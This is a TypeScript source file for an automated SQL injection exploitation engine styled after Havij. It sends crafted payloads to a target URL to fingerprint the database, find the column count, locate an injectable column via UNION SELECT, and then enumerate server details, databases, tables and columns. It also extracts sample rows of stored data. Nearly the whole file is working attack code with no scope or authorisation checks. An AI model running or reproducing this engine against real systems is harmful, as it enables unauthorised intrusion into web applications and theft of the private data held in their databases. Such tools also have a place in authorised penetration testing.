// VibeCode — SQLi Deep Exploiter (Havij-Style DB Enumeration)
// Automated SQL injection exploitation engine that extracts
// database structure, users, and sample data.

import { buildRequestString, buildResponseString } from '@/lib/utils';

// ============================================================
// TYPES
// ============================================================

export type DbmsFamily = 'mysql' | 'postgresql' | 'mssql' | 'oracle' | 'sqlite' | 'unknown';
export type ExploitTechnique = 'union-based' | 'error-based' | 'boolean-blind' | 'time-blind' | 'stacked';
export type InjectionPoint = 'query' | 'body' | 'header' | 'cookie' | 'path' | 'json' | 'multipart';

export interface ExploitStep {
    phase: string;
    payload: string;
    success: boolean;
    extracted?: string;
    error?: string;
}

export interface ColumnInfo {
    name: string;
    type: string;
    nullable?: boolean;
    key?: string;
}

export interface TableInfo {
    name: string;
    columns: ColumnInfo[];
    rowCount?: number;
    sampleRows: Record<string, unknown>[];
}

export interface DatabaseInfo {
    name: string;
    tables: TableInfo[];
}

export interface UserInfo {
    username: string;
    hostname?: string;
    privileges?: string[];
}

export interface PasswordHash {
    user: string;
    hash: string;
    cracked?: string;
}

export interface FileReadResult {
    path: string;
    content: string;
    success: boolean;
}

export interface OsCommandResult {
    command: string;
    output: string;
    success: boolean;
}

export interface TestedTechnique {
    technique: ExploitTechnique;
    success: boolean;
    payload?: string;
    evidence?: string;
}

export interface SqliExploitResult {
    dbms: string;
    dbmsFamily: DbmsFamily;
    dbmsVersion?: string;
    technique: ExploitTechnique;
    currentDatabase: string;
    currentUser: string;
    hostname: string;
    dataDir: string;
    columnCount: number;
    injectableColumn: number;
    databases: DatabaseInfo[];
    users?: UserInfo[];
    passwordHashes?: PasswordHash[];
    filesRead?: FileReadResult[];
    osCommands?: OsCommandResult[];
    testedTechniques: TestedTechnique[];
    exploitLog: ExploitStep[];
    startedAt: number;
    completedAt: number;
}

export interface DeepExploitConfig {
    requestTimeout: number;
    userAgent: string;
    customHeaders?: Record<string, string>;
    authHeaders?: Record<string, string>;
    maxDatabases?: number;
    maxTablesPerDb?: number;
    maxColumnsPerTable?: number;
    maxRowsPerTable?: number;
}

// ============================================================
// SQL ERROR PATTERNS (for DBMS fingerprinting)
// ============================================================

const DBMS_ERROR_PATTERNS: Array<{ pattern: RegExp; dbms: DbmsFamily }> = [
    { pattern: /SQL syntax.*MySQL/i, dbms: 'mysql' },
    { pattern: /Warning.*mysql_/i, dbms: 'mysql' },
    { pattern: /MySqlException/i, dbms: 'mysql' },
    { pattern: /You have an error in your SQL syntax/i, dbms: 'mysql' },
    { pattern: /PostgreSQL.*ERROR/i, dbms: 'postgresql' },
    { pattern: /pg_query|pg_exec/i, dbms: 'postgresql' },
    { pattern: /PSQLException/i, dbms: 'postgresql' },
    { pattern: /unterminated quoted string/i, dbms: 'postgresql' },
    { pattern: /ORA-\d{5}/i, dbms: 'oracle' },
    { pattern: /Oracle.*Driver/i, dbms: 'oracle' },
    { pattern: /Microsoft.*ODBC.*SQL Server/i, dbms: 'mssql' },
    { pattern: /Unclosed quotation mark/i, dbms: 'mssql' },
    { pattern: /SQLSTATE\[\w+\]/i, dbms: 'unknown' },
    { pattern: /SQLite.*error/i, dbms: 'sqlite' },
    { pattern: /sqlite3\.OperationalError/i, dbms: 'sqlite' },
];

// ============================================================
// HELPER: Make HTTP request for exploitation
// ============================================================

async function exploitRequest(
    url: string,
    method: string,
    paramName: string,
    paramType: InjectionPoint,
    payload: string,
    config: DeepExploitConfig,
): Promise<{ body: string; time: number } | null> {
    try {
        const headers: Record<string, string> = {
            'User-Agent': config.userAgent,
            ...config.customHeaders,
            ...config.authHeaders,
        };

        let fetchUrl = url;
        let fetchBody: string | undefined;

        if (paramType === 'query') {
            const u = new URL(url);
            u.searchParams.set(paramName, payload);
            fetchUrl = u.toString();
        } else {
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
            fetchBody = `${paramName}=${encodeURIComponent(payload)}`;
        }

        const startTime = Date.now();
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), config.requestTimeout);

        const response = await fetch(fetchUrl, {
            method,
            headers,
            body: fetchBody,
            signal: controller.signal,
            redirect: 'follow',
        });
        clearTimeout(timeoutId);

        const body = await response.text();
        return { body, time: Date.now() - startTime };
    } catch {
        return null;
    }
}

// ============================================================
// MAIN: Deep SQLi Exploitation
// ============================================================

export async function deepExploitSqli(
    url: string,
    method: string,
    paramName: string,
    paramType: InjectionPoint | string,
    config: DeepExploitConfig,
): Promise<SqliExploitResult | null> {
    const log: ExploitStep[] = [];
    const testedTechniques: TestedTechnique[] = [];
    const startedAt = Date.now();
    const injPoint = paramType as InjectionPoint;

    const maxDbs = config.maxDatabases ?? 10;
    const maxTables = config.maxTablesPerDb ?? 20;
    const maxCols = config.maxColumnsPerTable ?? 30;
    const maxRows = config.maxRowsPerTable ?? 5;

    const addLog = (phase: string, payload: string, success: boolean, extracted?: string, error?: string) => {
        log.push({ phase, payload, success, extracted, error });
    };

    // ── Phase 1: DBMS Fingerprint ─────────────────────────────
    let dbmsFamily: DbmsFamily = 'unknown';
    let dbms = 'Unknown';

    const fingerprints = [
        { payload: `' AND 1=CONVERT(int, @@version)-- -`, dbms: 'mssql' as DbmsFamily },
        { payload: `' AND 1=1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))-- -`, dbms: 'mysql' as DbmsFamily },
        { payload: `' AND 1=CAST(version() AS integer)-- -`, dbms: 'postgresql' as DbmsFamily },
        { payload: `' AND 1=CAST((SELECT sqlite_version()) AS integer)-- -`, dbms: 'sqlite' as DbmsFamily },
    ];

    for (const fp of fingerprints) {
        const res = await exploitRequest(url, method, paramName, injPoint, fp.payload, config);
        if (res) {
            const match = DBMS_ERROR_PATTERNS.find(p => p.pattern.test(res.body));
            if (match) {
                dbmsFamily = match.dbms;
                dbms = match.dbms.charAt(0).toUpperCase() + match.dbms.slice(1);
                addLog('fingerprint', fp.payload, true, `DBMS: ${dbms}`);
                testedTechniques.push({ technique: 'error-based', success: true, payload: fp.payload });
                break;
            }
        }
        addLog('fingerprint', fp.payload, false);
    }

    // If no error-based, try time-based fingerprint
    if (dbmsFamily === 'unknown') {
        const timePayloads = [
            { payload: `' OR SLEEP(3)-- -`, dbms: 'mysql' as DbmsFamily },
            { payload: `'; WAITFOR DELAY '0:0:3'-- -`, dbms: 'mssql' as DbmsFamily },
            { payload: `' OR pg_sleep(3)-- -`, dbms: 'postgresql' as DbmsFamily },
        ];
        for (const tp of timePayloads) {
            const res = await exploitRequest(url, method, paramName, injPoint, tp.payload, config);
            if (res && res.time > 2500) {
                dbmsFamily = tp.dbms;
                dbms = tp.dbms.charAt(0).toUpperCase() + tp.dbms.slice(1);
                addLog('fingerprint', tp.payload, true, `DBMS (time): ${dbms}, ${res.time}ms`);
                testedTechniques.push({ technique: 'time-blind', success: true, payload: tp.payload });
                break;
            }
            addLog('fingerprint', tp.payload, false);
        }
    }

    // ── Phase 2: Determine Column Count (ORDER BY) ──────────
    let columnCount = 0;
    for (let i = 1; i <= 30; i++) {
        const payload = `' ORDER BY ${i}-- -`;
        const res = await exploitRequest(url, method, paramName, injPoint, payload, config);
        if (!res) continue;
        const hasError = DBMS_ERROR_PATTERNS.some(p => p.pattern.test(res.body)) || /Unknown column/i.test(res.body) || /ORDER BY.*out of range/i.test(res.body);
        if (hasError) {
            columnCount = i - 1;
            addLog('column-count', payload, true, `Columns: ${columnCount}`);
            break;
        }
        addLog('column-count', payload, true);
    }
    if (columnCount === 0) columnCount = 3; // fallback

    // ── Phase 3: Find Injectable Column ─────────────────────
    let injectableColumn = 1;
    const nulls = Array(columnCount).fill('NULL');
    for (let i = 0; i < columnCount; i++) {
        const testNulls = [...nulls];
        testNulls[i] = "'VCODE_INJECT_TEST'";
        const payload = `' UNION SELECT ${testNulls.join(',')}-- -`;
        const res = await exploitRequest(url, method, paramName, injPoint, payload, config);
        if (res && res.body.includes('VCODE_INJECT_TEST')) {
            injectableColumn = i + 1;
            addLog('find-injectable', payload, true, `Injectable column: #${injectableColumn}`);
            break;
        }
        addLog('find-injectable', payload, false);
    }

    // Helper: inject expression via UNION
    const injectExpr = (expr: string) => {
        const cols = Array(columnCount).fill('NULL');
        cols[injectableColumn - 1] = expr;
        return `' UNION SELECT ${cols.join(',')}-- -`;
    };

    // Helper: extract value from response
    const extractValue = (body: string, marker: string) => {
        const idx = body.indexOf(marker);
        if (idx === -1) return '';
        // Try to extract the value near the marker
        const around = body.substring(Math.max(0, idx), idx + marker.length + 200);
        return around.replace(/<[^>]+>/g, '').trim().substring(marker.length).trim().split(/[\s<"']/)[0] || marker;
    };

    // ── Phase 4: Server Info ─────────────────────────────────
    let currentDatabase = '';
    let currentUser = '';
    let hostname = '';
    let dataDir = '';

    const serverQueries = dbmsFamily === 'mysql' ? [
        { expr: `CONCAT('VDB_',database())`, name: 'database', marker: 'VDB_' },
        { expr: `CONCAT('VUS_',current_user())`, name: 'user', marker: 'VUS_' },
        { expr: `CONCAT('VHN_',@@hostname)`, name: 'hostname', marker: 'VHN_' },
        { expr: `CONCAT('VDD_',@@datadir)`, name: 'datadir', marker: 'VDD_' },
    ] : dbmsFamily === 'postgresql' ? [
        { expr: `'VDB_'||current_database()`, name: 'database', marker: 'VDB_' },
        { expr: `'VUS_'||current_user`, name: 'user', marker: 'VUS_' },
        { expr: `'VHN_'||inet_server_addr()::text`, name: 'hostname', marker: 'VHN_' },
        { expr: `'VDD_'||current_setting('data_directory')`, name: 'datadir', marker: 'VDD_' },
    ] : dbmsFamily === 'mssql' ? [
        { expr: `'VDB_'+DB_NAME()`, name: 'database', marker: 'VDB_' },
        { expr: `'VUS_'+SYSTEM_USER`, name: 'user', marker: 'VUS_' },
        { expr: `'VHN_'+@@SERVERNAME`, name: 'hostname', marker: 'VHN_' },
        { expr: `'VDD_'+SERVERPROPERTY('InstanceDefaultDataPath')`, name: 'datadir', marker: 'VDD_' },
    ] : [
        { expr: `'VDB_unknown'`, name: 'database', marker: 'VDB_' },
    ];

    for (const q of serverQueries) {
        const payload = injectExpr(q.expr);
        const res = await exploitRequest(url, method, paramName, injPoint, payload, config);
        if (res && res.body.includes(q.marker)) {
            const value = extractValue(res.body, q.marker);
            if (q.name === 'database') currentDatabase = value;
            else if (q.name === 'user') currentUser = value;
            else if (q.name === 'hostname') hostname = value;
            else if (q.name === 'datadir') dataDir = value;
            addLog('server-info', payload, true, `${q.name}: ${value}`);
        } else {
            addLog('server-info', payload, false);
        }
    }

    // ── Phase 5: Enumerate Databases ─────────────────────────
    const databases: DatabaseInfo[] = [];
    const dbQuery = dbmsFamily === 'mysql'
        ? `GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata`
        : dbmsFamily === 'postgresql'
            ? `string_agg(datname,',') FROM pg_database`
            : dbmsFamily === 'mssql'
                ? `STRING_AGG(name,',') FROM sys.databases`
                : `'main'`;

    const dbPayload = injectExpr(`CONCAT('VDBS_',${dbQuery})`);
    const dbRes = await exploitRequest(url, method, paramName, injPoint, dbPayload, config);
    let dbNames: string[] = [];

    if (dbRes && dbRes.body.includes('VDBS_')) {
        const raw = extractValue(dbRes.body, 'VDBS_');
        dbNames = raw.split(',').filter(Boolean).slice(0, maxDbs);
        addLog('enum-databases', dbPayload, true, `DBs: ${dbNames.join(', ')}`);
    } else {
        // Fallback: use current database
        if (currentDatabase) dbNames = [currentDatabase];
        addLog('enum-databases', dbPayload, false, 'Using current database as fallback');
    }

    // ── Phase 6: Enumerate Tables & Columns ──────────────────
    for (const dbName of dbNames) {
        const db: DatabaseInfo = { name: dbName, tables: [] };

        // Get tables
        const tblQuery = dbmsFamily === 'mysql'
            ? `GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='${dbName}'`
            : dbmsFamily === 'postgresql'
                ? `string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'`
                : dbmsFamily === 'mssql'
                    ? `STRING_AGG(name,',') FROM ${dbName}.sys.tables`
                    : `group_concat(name) FROM sqlite_master WHERE type='table'`;

        const tblPayload = injectExpr(`CONCAT('VTBL_',${tblQuery})`);
        const tblRes = await exploitRequest(url, method, paramName, injPoint, tblPayload, config);
        let tableNames: string[] = [];

        if (tblRes && tblRes.body.includes('VTBL_')) {
            const raw = extractValue(tblRes.body, 'VTBL_');
            tableNames = raw.split(',').filter(Boolean).slice(0, maxTables);
            addLog('enum-tables', tblPayload, true, `${dbName}: ${tableNames.length} tables`);
        } else {
            addLog('enum-tables', tblPayload, false);
        }

        // Get columns for each table
        for (const tblName of tableNames) {
            const tbl: TableInfo = { name: tblName, columns: [], sampleRows: [] };

            const colQuery = dbmsFamily === 'mysql'
                ? `GROUP_CONCAT(column_name,'::',column_type SEPARATOR '||') FROM information_schema.columns WHERE table_schema='${dbName}' AND table_name='${tblName}'`
                : dbmsFamily === 'postgresql'
                    ? `string_agg(column_name||'::'||data_type,'||') FROM information_schema.columns WHERE table_name='${tblName}'`
                    : dbmsFamily === 'mssql'
                        ? `STRING_AGG(c.name+'::'+t.name,'||') FROM ${dbName}.sys.columns c JOIN sys.types t ON c.user_type_id=t.user_type_id WHERE c.object_id=OBJECT_ID('${dbName}..${tblName}')`
                        : `group_concat(name||'::text','||') FROM pragma_table_info('${tblName}')`;

            const colPayload = injectExpr(`CONCAT('VCOL_',${colQuery})`);
            const colRes = await exploitRequest(url, method, paramName, injPoint, colPayload, config);

            if (colRes && colRes.body.includes('VCOL_')) {
                const raw = extractValue(colRes.body, 'VCOL_');
                const cols = raw.split('||').filter(Boolean).slice(0, maxCols);
                tbl.columns = cols.map(c => {
                    const [name, type] = c.split('::');
                    return { name: name || c, type: type || 'unknown' };
                });
                addLog('enum-columns', colPayload, true, `${tblName}: ${tbl.columns.length} columns`);
            } else {
                addLog('enum-columns', colPayload, false);
            }

            // Extract sample rows
            if (tbl.columns.length > 0) {
                const colNames = tbl.columns.slice(0, 5).map(c => c.name);
                const concatExpr = dbmsFamily === 'mysql'
                    ? `GROUP_CONCAT(${colNames.map(c => `IFNULL(${c},'NULL')`).join(`,'|||',`)} SEPARATOR '###')`
                    : dbmsFamily === 'postgresql'
                        ? `string_agg(${colNames.map(c => `COALESCE(${c}::text,'NULL')`).join(`||'|||'||`)},'###')`
                        : `${colNames.join(',')}`;

                const selectFrom = dbmsFamily === 'mysql'
                    ? `${concatExpr} FROM ${dbName}.${tblName} LIMIT ${maxRows}`
                    : dbmsFamily === 'postgresql'
                        ? `${concatExpr} FROM ${tblName} LIMIT ${maxRows}`
                        : `TOP ${maxRows} ${concatExpr} FROM ${dbName}..${tblName}`;

                const rowPayload = injectExpr(`CONCAT('VROW_',${selectFrom})`);
                const rowRes = await exploitRequest(url, method, paramName, injPoint, rowPayload, config);

                if (rowRes && rowRes.body.includes('VROW_')) {
                    const raw = extractValue(rowRes.body, 'VROW_');
                    const rows = raw.split('###').filter(Boolean).slice(0, maxRows);
                    tbl.sampleRows = rows.map(row => {
                        const vals = row.split('|||');
                        const obj: Record<string, unknown> = {};
                        colNames.forEach((col, i) => {
                            obj[col] = vals[i] || '';
                        });
                        return obj;
                    });
                    tbl.rowCount = tbl.sampleRows.length;
                    addLog('sample-rows', rowPayload, true, `${tblName}: ${tbl.sampleRows.length} rows extracted`);
                } else {
                    addLog('sample-rows', rowPayload, false);
                }
            }

            db.tables.push(tbl);
        }

        databases.push(db);
    }

    // Only return result if we extracted something useful
    if (databases.length === 0 && !currentDatabase) return null;

    // Ensure at least one DB entry
    if (databases.length === 0 && currentDatabase) {
        databases.push({ name: currentDatabase, tables: [] });
    }

    return {
        dbms,
        dbmsFamily,
        technique: testedTechniques.find(t => t.success)?.technique || 'union-based',
        currentDatabase,
        currentUser,
        hostname,
        dataDir,
        columnCount,
        injectableColumn,
        databases,
        testedTechniques,
        exploitLog: log,
        startedAt,
        completedAt: Date.now(),
    };
}